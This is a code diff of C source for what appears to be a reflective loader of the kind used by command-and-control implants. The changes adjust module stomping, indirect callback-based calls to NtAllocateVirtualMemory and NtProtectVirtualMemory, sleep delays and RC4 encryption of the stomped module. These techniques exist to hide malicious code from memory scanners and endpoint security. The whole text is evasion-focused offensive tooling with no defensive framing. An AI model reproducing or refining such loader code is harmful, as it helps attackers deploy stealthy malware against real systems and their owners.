@@ -22,18 +22,19 @@ SEC(text, B) VOID CallbackFunctionCall(PINSTANCE Instance, PVOID ArgsStruct){
 SEC( text, B ) VOID Entry( VOID )
 {
     INSTANCE                Instance        = { 0 };
-    WCHAR          NameW[ 20 ]   = { 0 };
+    WCHAR                   NameW[ 20 ]   = { 0 };
     HMODULE                 KaynLibraryLdr  = NULL;
     PIMAGE_NT_HEADERS       NtHeaders       = NULL;
     PIMAGE_SECTION_HEADER   SecHeader       = NULL;
     LPVOID                  KVirtualMemory  = NULL;
     PFULLLDR_DATA_TABLE_ENTRY   StompedEntry    = NULL;
     SIZE_T                   KMemSize        = 0;
+    SIZE_T                  KMemSizeTmp     = 0;
     SIZE_T                   KHdrSize        = 0;
     PVOID                   SecMemory       = NULL;
-    SIZE_T                   SecMemorySize   = 0;
+    SIZE_T                  SecMemorySize   = 0;
     DWORD                   Protection      = 0;
-    ULONG Characteristics = 0x0002;
+    ULONG                   Characteristics = 0x0002;
     ULONG                   OldProtection   = 0;
     PIMAGE_DATA_DIRECTORY   ImageDir        = NULL;
     KAYN_ARGS               KaynArgs        = { 0 };
@@ -217,7 +218,7 @@ SEC( text, B ) VOID Entry( VOID )
     Instance.NTALLOCATEVIRTUALMEMORYARGS.pNtAllocateVirtualMemory = (UINT_PTR)Instance.Win32.NtAllocateVirtualMemory;
     Instance.NTALLOCATEVIRTUALMEMORYARGS.NUmberOfArgs = 6;
     Instance.NTALLOCATEVIRTUALMEMORYARGS.ProcessHandle = NtCurrentProcess();
-    Instance.NTALLOCATEVIRTUALMEMORYARGS.BaseAddress = &StompedAddress; //Characteristics set to 2 in order to not call entrypoint and load as EXE
+    Instance.NTALLOCATEVIRTUALMEMORYARGS.BaseAddress = &StompedAddress;
     Instance.NTALLOCATEVIRTUALMEMORYARGS.ZeroBits = 0;
     Instance.NTALLOCATEVIRTUALMEMORYARGS.RegionSize = &StompedSizeTmp;
     Instance.NTALLOCATEVIRTUALMEMORYARGS.AllocationType = MEM_COMMIT;
@@ -240,9 +241,9 @@ SEC( text, B ) VOID Entry( VOID )
             KaynArgs.KeyStompedModule.Buffer = StompedAddress;
             KaynArgs.KeyStompedModule.Length = KEYSIZE;
             KaynArgs.KeyStompedModule.MaximumLength = KEYSIZE;
-            //MemCopy(KaynArgs.KeyStompedModule.Buffer,key,KaynArgs.KeyStompedModule.Length);
+            MemCopy(KaynArgs.KeyStompedModule.Buffer,key,KaynArgs.KeyStompedModule.Length);
             //XOREncrypt(StompedAddress, StompedSize, key, KEYSIZE);
-            Instance.Win32.SystemFunction032(&(KaynArgs.Rc4StompedModule),&(KaynArgs.KeyStompedModule));
+            //Instance.Win32.SystemFunction032(&(KaynArgs.Rc4StompedModule),&(KaynArgs.KeyStompedModule));
         }
     }
 #endif
@@ -250,6 +251,7 @@ SEC( text, B ) VOID Entry( VOID )
     SecHeader = IMAGE_FIRST_SECTION( NtHeaders );
     KHdrSize  = SecHeader[ 0 ].VirtualAddress;
     KMemSize  = NtHeaders->OptionalHeader.SizeOfImage - KHdrSize;
+    KMemSizeTmp = KMemSize;
     Protection = PAGE_READWRITE;
 
     if ( KVirtualMemory != NULL){
@@ -259,7 +261,7 @@ SEC( text, B ) VOID Entry( VOID )
         Instance.NTPROTECTVIRTUALMEMORY_ARGS.NUmberOfArgs = 5;
         Instance.NTPROTECTVIRTUALMEMORY_ARGS.ProcessHandle = NtCurrentProcess();
         Instance.NTPROTECTVIRTUALMEMORY_ARGS.BaseAddress = &KVirtualMemory; //Characteristics set to 2 in order to not call entrypoint and load as EXE
-        Instance.NTPROTECTVIRTUALMEMORY_ARGS.RegionSize = &KMemSize;
+        Instance.NTPROTECTVIRTUALMEMORY_ARGS.RegionSize = &KMemSizeTmp;
         Instance.NTPROTECTVIRTUALMEMORY_ARGS.NewProtect = Protection;
         Instance.NTPROTECTVIRTUALMEMORY_ARGS.OldProtect = &OldProtection;
         CallbackFunctionCall(&Instance,&(Instance.NTPROTECTVIRTUALMEMORY_ARGS));
@@ -277,13 +279,13 @@ SEC( text, B ) VOID Entry( VOID )
         Instance.NTALLOCATEVIRTUALMEMORYARGS.ProcessHandle = NtCurrentProcess();
         Instance.NTALLOCATEVIRTUALMEMORYARGS.BaseAddress = &KVirtualMemory; //Characteristics set to 2 in order to not call entrypoint and load as EXE
         Instance.NTALLOCATEVIRTUALMEMORYARGS.ZeroBits = 0;
-        Instance.NTALLOCATEVIRTUALMEMORYARGS.RegionSize = &KMemSize;
+        Instance.NTALLOCATEVIRTUALMEMORYARGS.RegionSize = &KMemSizeTmp;
         Instance.NTALLOCATEVIRTUALMEMORYARGS.AllocationType = MEM_COMMIT;
         Instance.NTALLOCATEVIRTUALMEMORYARGS.Protect = PAGE_READWRITE;
         CallbackFunctionCall(&Instance,&(Instance.NTALLOCATEVIRTUALMEMORYARGS));
         SharedSleep(2000);
 #else
-        Instance.Win32.NtAllocateVirtualMemory(NtCurrentProcess(),&StompedAddress,0,&StompedSize,MEM_COMMIT,PAGE_READWRITE);
+        Instance.Win32.NtAllocateVirtualMemory(NtCurrentProcess(),&KVirtualMemory,0,&KMemSizeTmp,MEM_COMMIT,PAGE_READWRITE);
 #endif
         if(KVirtualMemory <= 0)
             goto FAILED;
